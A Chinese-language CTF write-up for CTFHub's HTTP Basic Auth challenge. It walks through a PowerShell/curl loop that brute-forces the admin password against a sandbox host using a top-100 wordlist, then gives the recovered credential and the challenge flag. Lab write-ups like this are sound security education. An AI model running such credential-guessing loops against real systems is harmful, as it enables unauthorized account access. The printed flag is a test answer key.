CTFHub - Web - Web前置技能 - HTTP协议 - 基础认证

# CTFHub # Web # HTTP协议 # Basic Auth # 密码爆破

一、题目信息

  • 题目名称：基础认证
  • 题目方向：Web - Web前置技能 - HTTP协议
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目附件：10_million_password_list_top_100.txt

二、解题工具

  • 浏览器开发者工具（F12）
  • Burp Suite Repeater / Intruder
  • cURL（命令行工具）

三、解题思路与步骤

  1. 信息收集：访问题目根路径，页面返回 200 OK，并提供了一个指向 /flag.html 的链接。
  2. 识别认证方式：直接访问 /flag.html，服务器返回 401 Unauthorized，响应头中包含： 
    WWW-Authenticate: Basic realm="Do u know admin ?"
    这说明目标是 HTTP Basic Auth，并且 realm 中已经提示用户名大概率是 admin。
  3. 理解 Basic Auth：客户端会将用户名和密码拼接成 username:password，再做 Base64 编码并放入请求头： 
    Authorization: Basic base64(username:password)
    cURL 的 --user 参数会自动完成这一过程。
  4. 利用密码字典：题目提供了 Top 100 密码表，因此只需固定用户名 admin，逐个测试密码。错误密码返回 401，正确密码返回 200： 
    $url = 'http://challenge-xxx.sandbox.ctfhub.com:10800/flag.html'
$passwords = Get-Content -LiteralPath '.\10_million_password_list_top_100.txt'

foreach ($password in $passwords) {
    $code = curl.exe --silent --output NUL --write-out '%{http_code}' --max-time 8 --user "admin:$password" $url

    if ($code -eq '200') {
        Write-Output "password=$password"
        break
    }
}
  5. 获取 Flag：密码表第 59 条命中，得到有效凭据 admin:daniel。使用该凭据访问： 
    curl.exe --user 'admin:daniel' http://challenge-xxx.sandbox.ctfhub.com:10800/flag.html
    返回的页面中包含最终 Flag。

四、最终 Flag

ctfhub{c41b66f07d4c9370479f30d3}

五、解题总结

  • 响应头是重要信息来源：WWW-Authenticate 直接暴露了认证方式和领域名称，并提示了用户名 admin。
  • 标准协议可以自动化测试：Basic Auth 的凭据格式固定，使用 cURL 或 Burp Suite Intruder 很容易结合密码字典进行批量验证。
  • Basic Auth 并不安全：它只对凭据进行 Base64 编码，并未加密；如果通过 HTTP 传输，凭据可以被网络中间人直接还原。
  • 不要使用弱密码：daniel 属于常见弱密码，攻击者可以通过字典快速得到凭据。
